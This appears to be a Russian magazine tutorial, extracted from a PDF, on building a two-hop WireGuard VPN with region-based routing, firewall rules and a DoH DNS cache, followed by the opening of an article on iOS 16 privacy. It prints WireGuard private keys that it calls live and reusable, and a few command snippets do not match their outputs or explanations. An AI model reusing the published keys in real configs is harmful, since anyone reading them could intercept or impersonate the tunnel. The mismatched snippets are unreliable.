 • Interface-PostUp и Interface-PostDown — скрипты, которые выпол-
   няют ся после под нятия и после остановки интерфейса. Есть еще PreUP
   и PreDown .

Кроме публичных и приват ных ключей, есть еще опция PresharedKey,
которая обеспечивает дополнитель ное шифрование сим метричным шифром.
Ключ можно сгенерировать, например, коман дой wg  genpsk и добавить
в опцию PresharedKey в сек циях Peer на обоих пирах. Если не исполь зовать
эту опцию, наг рузка по шифрованию и расшифровке не вырастет: ког да ключ
не указан, исполь зует ся нулевое значение ключа.
  А чтобы по-настоящему обеспечить пост кван товую безопасность (невоз-
можность расшифровки дан ных кван товыми компь ютерами), разработ чики
рекомен дуют дополнитель ный внеш ний кван тово-устойчивый механизм хен -
дшейка, например SIDH, который Microsoft пиарит имен но в таком кон тек сте.
Созданный им общий ключ можно исполь зовать в качестве PresharedKey.
   Зак линания в PostUp достаточно просты. Вот коман да для под становки
имени сетевого интерфейса, куда по умолчанию выполняет ся маршру тизация:


ip route | awk '/default/ {print $5; exit}'

Как правило, это интерфейс, обращен ный к провайдеру или роутеру.
   Таким образом, страш ная коман да превращается в такую:


iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

Здесь происходит включение NAT в режиме маскарада: сервер будет отправ-
лять пришед шие ему пакеты во внеш нюю сеть, под меняя адрес отправителя
своим, чтобы ответы на эти пакеты тоже приходили ему, а не исходному отпра-
вителю.
   Вторая коман да уже нем ного сложнее, но она под ставляет IP-адрес дефол-
тного маршру та.


`ip addr show $(ip route | awk '/default/ { print $5 }') | grep
"inet" | grep -v "inet6" | head -n 1 | awk '/inet/ {print $2}' |
awk -F / '{print $1}'`

Сначала мы получаем, как и выше, сетевой интерфейс маршру та по умол-
чанию:


root@:~# ip route | awk '/default/ { print $5 }'
enp1s0

Потом дан ные о состоянии этого интерфейса:


root@:~# ip route | awk '/default/ { print $5 }'
    inet 192.168.88.70/24 brd 192.168.88.255 scope global dynamic
enp1s0

И даль ше вытаскиваем отту да адрес, в дан ном слу чае 192.168.88.70.
Коман да становит ся такой:


ip rule add from 95.93.219.123 table mainё

Это необходимо для сервера internal , потому что иначе при активации мар-
шру та 0.0.0.0/0 он начинает пересы лать ответы на пакеты, приходящие ему
на внеш ние адреса через тун нель WG. Сервер на том кон це, конечно, пересы -
лает их по назначению, но тут уже не готов отправитель пакета: он присылает
что-то на внеш ний адрес сервера internal , а ответ ему приходит с external .
   Естествен но, при включен ном rp_lter пакет отбрасывается. В этом слу чае
сервер перестает быть доступным, например по SSH снаружи. К нему придет -
ся кон нектить ся толь ко по внут реннему IP WireGuard. Отключать rp_lter —
это стрелять из пуш ки по воробь ям, а вот дополнитель ное правило исправляет
ситу ацию.




                   Я  намеренно  не  при вожу  готовые  конфиги,
                       потому что хочу показать механизм создания
                        конфигов в руч ном режиме. В свое время я
                       генери ровал конфиги ути лита ми типа easy-wg-
                          quick или веб-сервисами, которые спра шива ют
                       тебя о названии кли ента и кра сиво показывают
                       QR-код. Это отнюдь не способс тву ет понима нию
                          того, как работа ет WG на самом деле, и может
                       вызвать проб лемы.


Теперь в оба кон фига надо добавить сек цию Peer, чтобы связать серверы
друг с дру гом.
   Генерируем из приват ного ключа публичный (вот в wg  pubkey как раз
и происходит криптомагия):


root@:~# echo "kOd3FVBggwpjD3AlZKXUxNTzJT0+f3MJdUdR8n6ZBn8=" | wg
pubkey
MxnOnIlKfSyZyRutnYyoWHb3Izjalgf1t8F1oPJiyyw=

Это публичный ключ сервера internal , его мы помещаем в сек цию Peer
на external :


/etc/wireguard/wg-external.conf
[Peer]
PublicKey=MxnOnIlKfSyZyRutnYyoWHb3Izjalgf1t8F1oPJiyyw=
AllowedIPs=10.20.30.0/24
Endpoint=195.2.79.13:17968
PersistentKeepalive=25

Там же, в Endpoint указываем адрес сервера internal и порт, который мы
задали в ListenPort.
  С AllowedIPs при исполь зовании wg-quick возникает неболь шая путаница.
Это имен но список IP-адресов, с которых мы разрешаем принимать пакеты
из тун неля. Если прилетит что-то с дру гим src, оно будет отброшено.
   Wg-quick разум но считает, что, если есть какие-то устройства, которые
могут послать пакет, пакеты к этим устройствам надо маршру тизировать туда
же, и создает маршру ты на эти адреса, указывающие на тун нель пира.
  В этих примерах AllowedIPs можно читать как «адреса, трафик на которые
будет маршру тизировать ся в тун нель этого пира и с которых пир сможет
отправить что-то в тун нель». То есть пункт AllowedIPs = 10.20.30.3/32
означает бук валь но «толь ко запросы на 10.20.30.3 (адрес пира WG) отправ-
лять в тун нель» — дать доступ толь ко до машины этого клиента.
Пункт AllowedIPs  =  192.168.88.0/24 означает, что при запросе адреса
из этой под сети запрос уйдет в тун нель клиента, и если у него включен фор-
вардинг и ему доступна эта под сеть, то к ней можно будет получить доступ.
   AllowedIPs = 0.0.0.0/0 означает, что в тун нель надо маршру тизировать
вообще весь трафик. Правда, это не относит ся к трафику, например, локаль -
ной сети: приоритет у маршру та, который создает ся из маски под сети и адреса
шлюза, выше, чем у 0.0.0.0/0. Так же маршрут 0.0.0.0/0 перебь ют маршру ты
дру гих пиров, если они будут в кон фиге.
  В  дан ном  слу чае  AllowedIPs=10.20.30.0/24  означает,  что  трафик
с external в под сеть 10.20.30.0–10.20.30.255 будет уходить в тун нель
к internal . В прин ципе, особой нужды в этом нет, external у нас исключитель -
но выход ная нода. Но вдруг мы как-нибудь захотим зайти отту да по SSH
на какую-нибудь дру гую машину.
   Повторяем генерацию публичного ключа с external :


root@:~# echo "6CCRP42JiTObyf64Vo0BcqsX6vptsqOU+MKUslUun28=" | wg
pubkey
FulnUTovyyfgn5kmgPkcj2OjKRFGeLkaTsHtAOy6HW8=

Мы получаем публичный ключ сервера external и помещаем его в сек цию
Peer сервера internal .


/etc/wireguard/wg-internal.conf
[Peer] #external node
PublicKey = FulnUTovyyfgn5kmgPkcj2OjKRFGeLkaTsHtAOy6HW8=
AllowedIPs = 10.20.30.2/32, 0.0.0.0/0

AllowedIPs тут 10.20.30.2/32, 0.0.0.0/0. Этим мы указываем, что за тун -
нелем находит ся кон крет ный IP 10.20.30.2, и, помимо этого, пробрасываем
весь трафик, не связан ный дру гими маршру тами, в этот тун нель: external
у нас основная выход ная нода VPN.
  Поэтому по умолчанию весь трафик будет направлять ся через нее, так
как зарубежных маршру тов боль ше, чем российских, и логичнее филь тровать
имен но российские, а зарубежный трафик пустить по умолчанию через ноду
в дру гой стране.
   Итак, два кон фига.


/etc/wireguard/wg-internal.conf
[Interface]
Address = 10.20.30.1/32
ListenPort = 17968
PrivateKey = kOd3FVBggwpjD3AlZKXUxNTzJT0+f3MJdUdR8n6ZBn8=
PostUp = iptables -t nat -A POSTROUTING -o `ip route | awk '/
default/ {print $5; exit}'` -j MASQUERADE
PostUp = ip rule add from `ip addr show $(ip route | awk '/
default/ { print $5 }') | grep "inet" | grep -v "inet6" | head -n
1 | awk '/inet/ {print $2}' | awk -F/ '{print $1}'` table main
PostDown = iptables -t nat -D POSTROUTING -o `ip route | awk '/
default/ {print $5; exit}'` -j MASQUERADE
PostDown = ip rule del from `ip addr show $(ip route | awk '/
default/ { print $5 }') | grep "inet" | grep -v "inet6" | head -n
1 | awk '/inet/ {print $2}' | awk -F/ '{print $1}'` table main


#external node
[Peer]
PublicKey = FulnUTovyyfgn5kmgPkcj2OjKRFGeLkaTsHtAOy6HW8=
AllowedIPs = 10.20.30.2/32, 0.0.0.0/0


/etc/wireguard/wg-external.conf
[Interface]
Address = 10.20.30.2/32
PrivateKey = 6CCRP42JiTObyf64Vo0BcqsX6vptsqOU+MKUslUun28=
PostUp = iptables -t nat -A POSTROUTING -o `ip route | awk '/
default/ {print $5; exit}'` -j MASQUERADE
PostDown = iptables -t nat -D POSTROUTING -o `ip route | awk '/
default/ {print $5; exit}'` -j MASQUERADE


#internal node
[Peer]
PublicKey = MxnOnIlKfSyZyRutnYyoWHb3Izjalgf1t8F1oPJiyyw=
AllowedIPs = 10.20.30.0/24
Endpoint = 195.2.79.13:17968
PersistentKeepalive = 25

Теперь можно под нять тун нели на обоих серверах:


root@trikster-external:~# wg-quick down wg-external ; wg-quick up
wg-external


root@trikster-internal:~# wg-quick down wg-internal ; wg-quick up
wg-internal

Проверяем, что тун нели активны, коман дой wg:


root@trikster-internal:~# wg
...
peer: FulnUTovyyfgn5kmgPkcj2OjKRFGeLkaTsHtAOy6HW8=
  endpoint: 51.159.187.77:36276
  allowed ips: 10.20.30.2/32, 0.0.0.0/0
  latest handshake: 13 seconds ago
  transfer: 180 B received, 92 B sent


root@trikster-external:~# wg
...
peer: MxnOnIlKfSyZyRutnYyoWHb3Izjalgf1t8F1oPJiyyw=
  endpoint: 195.2.79.13:17968
  allowed ips: 10.20.30.0/24
  latest handshake: 10 seconds ago
  transfer: 92 B received, 180 B sent
  persistent keepalive: every 25 seconds

Если видим «latest handshake: ... seconds ago» и байты и в received и в sent,
значит, все хорошо. Если байты толь ко в send, без хен дшейка и получен ных
дан ных, значит, где-то в кон фиге ошибка или серверы недоступны друг
для дру га.
   Если что-то пош ло не так и отвалился SSH, то достаточно перезаг рузить
сервер — активные тун нели сбросят ся.
   Если же все хорошо и доступ к серверам сохранился, ставим тун нели
в автозапуск:


root@trikster-internal:~# systemctl enable wg-quick@wg-internal.
service


root@trikster-external:~# systemctl enable wg-quick@wg-external.
service

Попробу ем  посмотреть  маршрут  (рекомен дую  замечатель ную  утилиту
mytraceroute, mtr) без тун неля:


root@trikster-internal:~# wg-quick down wg-internal && sleep 10 &&
mtr -r google.com
HOST: trikster-internal.local     Loss%   Snt   Last   Avg  Best
Wrst StDev
  1.|-- host-89-22-232-243.hosted  0.0%    10    0.3   5.4   0.3
49.8  15.6
  2.|-- 172.31.0.1                 0.0%    10    0.3  19.8   0.3
122.2  42.6
  3.|-- 109.239.138.90             0.0%    10    1.5   1.9   1.4
 3.0   0.6
  4.|-- 91.108.51.4                0.0%    10   11.4  11.4  11.3
11.7   0.1
  5.|-- 178.18.227.12.ix.dataix.e  0.0%    10   11.0  17.9  11.0
77.0  20.8

И с тун нелем:


root@trikster-internal:~# wg-quick up wg-internal && sleep 10 &&
mtr -r google.com
HOST: trikster-internal.local     Loss%   Snt   Last   Avg  Best
Wrst StDev
  1.|-- 10.20.30.2                 0.0%    10   51.3  51.3  51.2
51.4   0.1
  2.|-- 10.200.100.0               0.0%    10   51.4  51.4  51.2
51.6   0.1
  3.|-- 10.197.37.65               0.0%    10   52.5  52.2  52.0
52.5   0.2
  4.|-- 10.197.0.41                0.0%    10   52.2  52.2  52.1
52.5   0.1
  5.|-- 10.197.0.44                0.0%    10   52.0  52.2  51.9
52.4   0.1

Все хорошо, трафик идет через внеш ний сервер — сначала на 10.20.30.2,
который у нас назначен выход ной нодой, а потом через его маршру тизаторы.
   У нас получилась примерно следующая схема.





ØÀÃ 3. ÄÎÁÀÂËßÅÌ ÊÎÍÔÈÃ ÊËÈÅÍÒÀ

Создаем кон фиг клиента, конечного устройства — поль зователя VPN. За осно-
ву берем wg-external.conf, потому что это точно такой же клиент, который
под ключает ся к internal : разница толь ко в том, что external будет получать
пакеты, а наш клиент — отправлять.
   Генерируем ему сразу пару публичный и приват ный ключ:


root@:~# prk=`wg genkey` && pbk=`echo $prk | wg pubkey` && printf
"Private: $prk\nPublic: $pbk\n"
Private: iPK7hYSU8TLVRD+w13nd3aGSYNLfnTx6zwdRzKcGb1o=
Public: 26Vhud00ag/bdB9molvSxfBzZTlzdO+aZgrX3ZDncSg=

Кон фиг почти такой же (этот файл уже должен быть на твоем устройстве, не на
сервере):


/etc/wireguard/wg-notebook-client.conf
[Interface]
Address = 10.20.30.3/32
PrivateKey = iPK7hYSU8TLVRD+w13nd3aGSYNLfnTx6zwdRzKcGb1o=
DNS = 1.1.1.1, 8.8.8.8


#internal node
[Peer]
PublicKey = MxnOnIlKfSyZyRutnYyoWHb3Izjalgf1t8F1oPJiyyw=
AllowedIPs = 0.0.0.0/0
Endpoint = 195.2.79.13:17968
PersistentKeepalive = 25

Тут у нас добавилась опция PersistentKeepalive. Дело в том, что роутеры
в цепочке между дву мя пирами ничего не знают о сессии WG, а знают толь ко
о потоке UDP-пакетов. Для маршру тизации UDP-пакетов за NAT они создают
у себя табличку, в которую записы вают, кто, куда и на какой порт отправил
пакет. И если с destination-адреса/порта приходит UPD-пакет, то они опре-
деляют, куда его отправить, по этой таблице, делая вывод, что если сервер B
недавно отправил пакет серверу А, то ответ от сервера А на этот же адрес
и порт, скорее всего, надо переслать серверу B.
  В UDP, в отличие от TCP, нет никаких договорен ностей о под держании сес-
сии, так как нет и самого понятия сессии. WG же построен таким образом, что
при отсутствии трафика, попадающего в тун нель, не будет и трафика между
пирами, толь ко хен дшейки раз в две минуты. Опция PersistentKeepalive
заставляет его посылать пустые пакеты каждые 25  с, что предот вращает
потерю маршру та на промежу точных роутерах. Без этого мы бы мог ли раз
за разом отправлять пакеты, до второго пира они не доходили бы, а он бы
об этом не знал.
   Даль ше мы добавляем еще одну сек цию Peer в кон фиг на internal —
для клиента:


#notebook-client node
[Peer]
PublicKey = 26Vhud00ag/bdB9molvSxfBzZTlzdO+aZgrX3ZDncSg=
AllowedIPs = 10.20.30.3/32

Перезапускаем тун нель на internal  (wg-quick  down/up), под ключаем ся…
Есть хен дшейк! Дан ные пош ли.
   Теперь смот рим свой IP (например, на reg.ru ): видим IP external ноды
и дру гую страну.
   Таким же образом создаем кон фиги для дру гих клиентов. Если это мобиль -
ные устройства, то удобнее показать им QR-код. Он делается следующим
образом. Создаем в текущей папке кон фиг как обычно (конечно, с новыми
ключами и дру гим IP), называем, например, wg-moblie-client.conf. А даль -
ше прямо коман дой в кон соли создаем QR-код, который сканиру ем с телефо-
на:


root@:~# qrencode -t ansiutf8 < wg-moblie-client.conf

Это удобнее, чем копирование файлов, но тебе ник то не мешает скинуть wg-
moblie-client.conf на телефон или вообще ввести значения семи полей
вручную.
   Теперь наша схема выг лядит следующим образом.





В целом все готово: мы толь ко что сделали очень стран ный двуххоповый VPN.
Надо это дело отметить! Откры ваем Сбермаркет, чтобы заказать пивка...





Ах да, мы же с этой проблемой и собирались бороть ся. Неловко!
Давай доделаем.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИПРИВАТНОСТЬ




                                РАЗБИРАЕМСЯ
                              С WIREGUARD
                                И ДЕЛАЕМ
                           СВОЙ УМНЫЙ VPN





ØÀÃ 4. ÄÎÁÀÂËßÅÌ ÐÅÃÈÎÍÀËÜÍÎ ÇÀÂÈÑÈÌÓÞ
ÌÀÐØÐÓÒÈÇÀÖÈÞ

Как ты пом нишь, мы отправляем все дан ные с клиента на internal , он все дан -
ные шлет на external , а тот уже своему провайдеру. Так же мы пом ним, что
у нас на internal «слабый» маршрут 0.0.0.0/0, который перебивает ся любыми
дру гими маршру тами, а сам internal находит ся в российском сег менте. Зна-
чит, все, что нам надо, — это как-то перехватить запросы на российские IP
на уровне internal и перенаправить их не в тун нель WG до external , а нап-
рямую в сетевой порт самого сервера, в тот, через который он получает доступ
в православный, российский интернет со скрепами и девицами в кокош никах.
  Давай проверим пред положение. На клиенте получим IP того же Сбер-
маркета  (nslookup  sbermarket.ru) и посмотрим, как туда идет трафик
(traceroute 212.193.158.175):


HOST: vvzvladMBP14.local          Loss%   Snt   Last   Avg  Best
Wrst StDev
  1.|-- 10.20.30.1                 0.0%    10    3.9   4.3   3.2
 6.5   1.1
  2.|-- 10.20.30.2                 0.0%    10   55.7  56.0  54.6
59.2   1.2
  3.|-- 10.200.100.0               0.0%    10   55.5  56.1  54.9
58.6   1.1
  4.|-- 10.197.37.65               0.0%    10   56.0  56.9  55.4
60.1   1.7
  5.|-- 10.197.0.41                0.0%    10   56.1  57.0  55.7
60.9   1.6

Ага, как и ожидалось, через external .
   Теперь создадим маршрут до этого адреса через дефолтный шлюз
и устройство. Их можно узнать в ip r:


root@trikster-internal:~# ip r
default via 195.2.79.1 dev ens3 onlink
10.20.30.2 dev wg-internal scope link
...

195.2.79.1 и ens3 — это и есть нужные нам дан ные. Исполь зуем уже зна-
комые под становочные коман ды и создадим новый маршрут:


target_ip="212.193.158.175/32"
gateway=`ip route | awk '/default/ {print $3; exit}'`
gateway_device=`ip route | awk '/default/ {print $5; exit}'`
ip route add $target_ip via $gateway dev $gateway_device

Проверяем:


root@trikster-internal:~# ip r
default via 195.2.79.1 dev ens3 onlink
10.20.30.2 dev wg-internal scope link
10.20.30.3 dev wg-internal scope link
195.2.79.0/24 dev ens3 proto kernel scope link src 195.2.79.13
==> 212.193.158.175 via 195.2.79.1 dev ens3 <==

Да, на последнем месте у нас нужный маршрут.
   Теперь повторяем коман ду traceroute -r 212.193.158.175 на клиенте
и видим, что трейс дру гой:


HOST: vvzvladMBP14.local          Loss%   Snt   Last   Avg  Best
Wrst StDev
  1.|-- 10.20.30.1                 0.0%    10    4.3   7.9   3.7
29.1   7.9
  2.|-- host-89-22-232-243.hosted  0.0%    10    4.6   4.9   3.8
 9.2   1.6
  3.|-- 172.31.0.1                 0.0%    10   25.9   8.4   3.3
25.9   6.9
  4.|-- sw1-m9p2-msk.ip.ngenix.ne  0.0%    10    6.2   5.7   4.0
 7.3   1.0
  5.|-- cdn.ngenix.net             0.0%    10    3.8   5.0   3.8
 8.4   1.3

Ура, Сбермаркет откры вает ся! Правда, такое сработает не со всеми сер-
висами: например, JavaScript на сайте может дернуть дру гой сервер, а не тот,
в адрес которого резолвится имя домена и до которого нет маршру та.
  Можно сходить на asnlookup.com, вбить туда адрес и получить принад -
лежность адреса к AS и заод но список под сетей этой autonomous system (у
Сбермаркета это AS34879, OOO Sovremennye setevye tekhnologii). С боль шой
вероятностью для более-менее крупных ком паний это и будет их сетевая
инфраструк тура (ну или, по крайней мере, инфраструк тура, относящаяся к кон -
крет ному сайту), прописав для которой маршру ты ты обеспечишь доступ
на нужный сайт или сервис. Для мелких сайтов ты, скорее всего, получишь AS
хостера или дата-цен тра, но, во-первых, это тоже сработает, а во-вторых, мел-
кие сайты обычно и не зак рывают иностран ные диапазоны, потому что
не испы тывают проблем с DDoS из-за границы.
  Но можно сделать проще и автоматически: засунуть в маршру ты вообще
все адреса российского сег мента (спасибо статье на Хабре) и не парить ся
о ручном добавлении.
   RIPE отдает их все в виде JSON вот по этому адресу:
   https://stat.ripe.net/data/country-resource-list/data.json?resource=ru
   Утилита jq преобразует из JSON в список под сетей:


curl https://stat.ripe.net/data/country-resource-list/data.json?
resource=ru | jq -r ".data.resources.ipv4[]"

Правда, почему-то некоторые адреса там в формате 195.85.234.0-195.85.
236.255, а не в виде под сети. Их там с десяток, можно было бы так и оставить,
но, если уж начали делать, давай сделаем до кон ца и красиво. Нам понадобит -
ся утилита ipcalc.


root@:~# ipcalc 195.85.234.0-195.85.236.255 |grep -v "deaggregate"
195.85.234.0/23
195.85.236.0/24

Вы делить эти адреса из базового списка лег ко: grep '-' или grep -v '/'.
   Скрипт для заг рузки роутов выг лядит как-то так (я не удержался и добавил
туда еще и прог ресс-бар):


#!/bin/bash


function ProgressBar {
  let _progress=(${1}* 100/ ${2}* 100 ) /100
  let _done=(${_progress}* 4 ) /10
  let _left= 40- $_done
  _fill=$(printf "%${_done}s")
  _empty=$(printf "%${_left}s")
  printf "\rAdd routes to route table (${1}/${2}): [${_fill// /#}
${_empty// /-}] ${_progress}%%"
}


# Variables
file_raw="russian_subnets_list_raw.txt"
file_user="subnets_user_list.txt"
file_for_calc="russian_subnets_list_raw_for_calc.txt"
file_processed="russian_subnets_list_processed.txt"
gateway_for_internal_ip=`ip route | awk '/default/ {print $3;
exit}'`
interface=` ip link show | awk -F ': ' '/state UP/ {print $2}'`


# Get addresses RU segment
echo "Download RU subnets..."
curl --progress-bar "https://stat.ripe.net/data/
country-resource-list/data.json?resource=ru" | jq -r ".data.
resources.ipv4[]" > $file_raw


echo "Deaggregate subnets..."
cat $file_raw |grep "-" > $file_for_calc
cat $file_raw |grep -v "-" > $file_processed
for line in $(cat $file_for_calc); do ipcalc $line |grep -v
"deaggregate" >> $file_processed; done


if [ -e $file_user  ]; then echo "Add user subnets..."; cat
$file_user |grep -v "#" >> $file_processed; fi


# Flush route table
echo "Flush route table (down interface $interface)..."
ifdown $interface > /dev/null 2>&1
echo "Up interface $interface..."
ifup $interface > /dev/null 2>&1


# Add route
routes_count_in_file=`wc -l $file_processed`
routes_count_current= 0
for line in $(cat $file_processed); do ip route add $line via
$gateway_for_internal_ip dev $interface; let
"routes_count_current+=1" ; ProgressBar ${routes_count_current} ${
routes_count_in_file}; done
echo ""


echo "Remove temp files..."
rm $file_raw $file_processed $file_json $file_for_calc


routes_count=`ip r | wc -l`
echo "Routes in routing table: $routes_count"

Добавим строчки в крон ( EDITOR=nano crontab -e), чтобы он запускался пос-
ле перезаг рузки и каждую неделю — обновить список адресов, если они
поменялись:


@reboot sleep 30 && bash /root/update_ru_routes.sh > /root/update_
routes_log.txt 2>&1
0 3 * * mon bash /root/update_ru_routes.sh > /root/update_routes_
log.txt 2>&1

Если тебе нужно принудитель но маршру тизировать какую-то сеть через
internal , то можно рядом со скриптом создать файлик subnets_user_list.
txt, в который поместить список под сетей, тог да они каждый раз будут добав-
лять ся к общему списку при обновлении (в скрипте выше эта возможность уже
реализована).
   Мой, например, выг лядит так:


#avito
146.158.48.0/21
#
#telegram
91.108.4.0/22
91.108.8.0/22
91.108.58.0/23
95.161.64.0/20
149.154.160.0/21

Первая под сеть — для мобиль ного приложения «Авито»: ее почему-то не было
в списке RIPE. Даль ше под сети для «Телег рама», чтобы хоть нем ного ускорить
заг рузку фото и видео.
  Проверяем.





Как видишь, разные сервисы показы вают нам разные адреса, потому что один
сервис хостится где-то внут ри России, а дру гой — снаружи. Работает!
   Кстати, если у тебя internal находит ся в домаш ней сети, бонусом ты
получишь доступ к домаш ней сети из любого места, где находит ся устройство
со включен ным VPN: маршрут 0.0.0.0/0 на устройстве отправляет в VPN весь
трафик, а internal , замечая трафик в ту под сеть, в которой он находит ся,
отправляет ее в локаль ный порт, а не в тун нель до external . Очень удобно:
у меня в домаш ней сети работает сервер с докер-кон тейнерами web2rss,
ownCloud, navidrome, freshrss, rss-bridge, homeassistant, и мне для получения
доступа к ним совершенно не надо заморачивать ся с пробросом портов, авто-
ризацией каждого сервера и HTTPS, не говоря уж о том, что некоторые сер-
висы, типа IoT-устройств, не имеют ни авторизации, ни шифрования в прин -
ципе.





                      Окон чатель ная схема


ØÀÃ 5. ÍÀÑÒÐÀÈÂÀÅÌ ÔÀÉÐÂÎË

Полезной привычкой и хорошим тоном будет зак рыть все ненужное на сер-
верах.
   Для начала на обоих серверах редак тиру ем файл /etc/default/ufw, изме-
няя значение DEFAULT_FORWARD_POLICY на ACCEPT.
   Теперь выполняем следующие коман ды на internal :


ufw reset
ufw default deny incoming
ufw default allow outgoing
ufw allow ssh
ufw allow 17968/udp
ufw allow in on wg-internal
systemctl enable ufw --now
ufw enable

Что происходит, думаю, понят но — запретить все, разрешить исходящие, вхо-
дящие SSH и под ключения к WG, а что приходит из тун неля — разрешить.
  На external то же самое, но откры вать порт для WG не надо — он под клю-
чает ся сам.


ufw reset
ufw default deny incoming
ufw default allow outgoing
ufw allow ssh
ufw allow in on wg-external
systemctl enable ufw --now
ufw enable

Еще хорошо бы поставить и настроить fail2ban или хотя бы перенести SSH
на дру гой порт. В любом слу чае отключение входа по паролю через SSH вооб-
ще и переход толь ко на авторизацию по ключу — это базовая операция,
не зависимо ни от чего.


ØÀÃ 6, ÁÎÍÓÑÍÛÉ È ÍÅÎÁßÇÀÒÅËÜÍÛÉ. ÊÅØÈÐÓÞÙÈÉ
ÇÀÙÈÙÅÍÍÛÉ DNS OVER HTTPS

Теперь нам нужна еще одна вещь — DNS.
  Можно, конечно, жить с DNS 1.1.1.1, но надо учитывать, что трафик
на него пойдет через external , а это автоматически означает задержку поряд -
ка 100 мс при каждом запросе. Можно, конечно, добавить 1.1.1.1/32
в subnets_user_list.txt, и тог да трафик пойдет через локаль ную ноду
и локаль ный сервер 1.1.1.1. Это умень шит задержку до 10–20 мс, но твои
DNS-запросы будет доступны провайдеру, что в слу чае локаль ной ноды
для кого-то может быть неприем лемо.
  Несколь кими коман дами можно лег ко сделать кеширу ющий DNS, который
еще и будет работать с DNS over HTTPS, а значит, провайдер узнает толь ко,
что исполь зовался DoH, но не сами запросы. Это, конечно, не обязатель но:
у меня internal находит ся в домаш ней сети, и я просто исполь зую DNS «Мик -
ротика», который находит ся в той же сети и под держивает DoH. Но если у тебя
internal -сервер — это VPS, то можно сделать там и DNS-сервер. Исполь -
зовать будем cloudared и dnsmasq.
  Добавляй репозитарий:


mkdir -p --mode=0755 /usr/share/keyrings
curl -fsSL https://pkg.cloudflare.com/cloudflare-main.gpg |  tee /
usr/share/keyrings/cloudflare-main.gpg > /dev/null
echo 'deb [signed-by=/usr/share/keyrings/cloudflare-main.gpg]
https://pkg.cloudflare.com/cloudflared buster main' | tee /etc/
apt/sources.list.d/cloudflared.list
sudo apt-get update && sudo apt-get install cloudflared dnsmasq -y

Пишем кон фиг:


/etc/cloudflared/config.yml
logfile: /var/log/cloudflared.log
proxy-dns: true
proxy-dns-upstream:
 - https://1.0.0.1/dns-query
 - https://1.1.1.1/dns-query
 - https://2606:4700:4700::1111/dns-query
 - https://2606:4700:4700::1001/dns-query
proxy-dns-port: 5353
proxy-dns-address: 127.0.0.1

Как вариант, можешь заменить в proxy-dns-upstream записи таким адресом:


https://security.cloudflare-dns.com/dns-query

Или таким:


https://9.9.9.9/dns-query

Первый — это блокировщик малвари, второй — это Quad9.
  Создай сервис:


/etc/systemd/system/cloudflared.service
[Unit]
Description=DNS over HTTPS (DoH) proxy client
Wants=network-online.target nss-lookup.target
Before=nss-lookup.target


[Service]
AmbientCapabilities=CAP_NET_BIND_SERVICE
CapabilityBoundingSet=CAP_NET_BIND_SERVICE
DynamicUser=yes
ExecStart=/usr/local/bin/cloudflared --config /etc/cloudflared/
config.yml


[Install]
WantedBy=multi-user.target

Теперь осталось запустить его и засунуть в автозаг рузку:


systemctl daemon-reload
systemctl start cloudflared
systemctl status cloudflared
systemctl enable cloudflared

Проверяем:


dig @127.0.0.1 -p5353 google.com

У cloudared есть один минус — у него стран ное кеширование, которое дер-
жится совсем недолго, поэтому для кеширования дополнитель но настроим
dnsmasq, указав ему в качестве сервера cloudared.
  Поэтому надо добавить в /etc/dnsmasq.conf что-то вроде таких строк:


server=127.0.0.1#5353
no-poll
no-resolv
listen-address=10.20.30.1, 127.0.0.1
cache-size=1500
stop-dns-rebind
clear-on-reload
no-negcache

Запускаем:


systemctl restart dnsmasq.service

Проверяем:


dig @127.0.0.1 google.com

И уже можно сделать это с клиента:


dig @10.20.30.1 google.com

Если ответ на запрос есть, значит, DNS работает и можно запустить коман ду
несколь ко раз — при повторных запросах Query time должен стать 0 мс
или около того, если ты запрашиваешь localhost, или будет близко к пин гу
до internal , если делаешь это с клиента.
   Теперь можно добавить в кон фиги клиентов в сек цию Interface:


DNS = 10.20.30.1, 1.1.1.1

Особые параноики могут запустить cloudared на external и скрыть от локаль -
ного провайдера даже сам факт исполь зования DoH. Для этого в proxy-dns-
address в кон фиге cloudared и в dnsmasq.conf надо просто указать 10.20.30.2
(IP-адрес external ).
   Кстати, в качестве аль тернативы можно поставить на тот же сервер утилиту
Pi-hole, которая делает примерно то же самое, но еще блокиру ет рек ламу
и показы вает красивую статистику.


ÂÛÂÎÄÛ

Пары ключей в статье — действу ющие, так что можешь, ничего не исправляя
в кон фигах (толь ко IP internal -сервера), залить их на свои серверы и клиент
и поразвлекать ся. Но для боевого применения ключи надо обязатель но
перегенерить.
   Благо это просто, даже если тебе лень разбирать ся с ручной генерацией
ключей, — я создал неболь шой bash-скрипт для этого. Достаточно сделать так
на internal -сервере:


apt install -y git
git clone https://github.com/vvzvlad/trickster-vpn.git
cd trickster-vpn/config_generator
bash generate_cfgs.sh

После чего в папке trickster-vpn/config_generator/configs появят ся кон -
фиги с толь ко что сгенерирован ными ключами, и останет ся толь ко скопировать
wg-internal.conf в /etc/wireguard/wg-internal.conf, wg-external.conf
унести на дру гой сервер, а wg-mobile-client.conf исполь зовать для ноут -
бука или телефона. Ну и не забыть о пробросе порта, если internal у тебя
за NAT.
   Если кто-то захочет это все красиво обернуть в два докера и прик рутить
один из веб-интерфейсов для WireGuard (потому что кон фиги клиентов все же
удобнее создавать в нем) — добро пожаловать на гит хаб: Trickster VPN.
ПРИВАТНОСТЬ





          ИЗУЧАЕМ НОВЫЕ
     СПОСОБЫ ЗАЩИТЫ ДАННЫХ
         В ПОСЛЕДНЕЙ iOS





Безопасность лич ных дан ных — нап равле-
ние,  которое  активно  раз вива ют  раз -
работ чики мобильных ОС. В Apple защиту,
по сути, прев ратили в товар; это му воп -
росу посвящен целый раз дел на сай те          Олег Афонин                                                                                       Эксперт по мобильной
ком пании. Сегод ня мы погово рим о том,       криминалистике компании                                                                                     «Элкомсофт»
что нового в сфере кон фиден циальности       aoleg@voicecallcentral.com
и безопасности появи лось в свежей вер -
сии iOS 16, анон сирован ной 7 сен тября.


SAFETY CHECK

Фун кция  Safety  Check  («проверка  безопасности»)  позволяет  проверить
или быстро сбросить настройки кон фиден циаль ности, отвечающие за доступ
к дан ным, который ты ког да-то предоставлял людям, приложениям или устрой-
ствам.





                                 Safety Check

Что это означает на прак тике? Допустим, ког да-то давно ты открыл кому-то
доступ к своему местоположению, а этот кто-то твоим доверием злоупот -
ребил. Напом ню, в таком слу чае у доверен ного лица будет возможность
в любой момент узнать, где ты находишь ся, с доволь но высокой точностью.
При некоторой сноровке можно организовать полноцен ную слежку. Safety
Check позволит просмотреть, у кого есть такой доступ, и отключить его у не
оправдавших доверие лиц. Под робнее о том, как это сделать, можно прочитать
в замет ке, посвящен ной фун кции Safety Check .
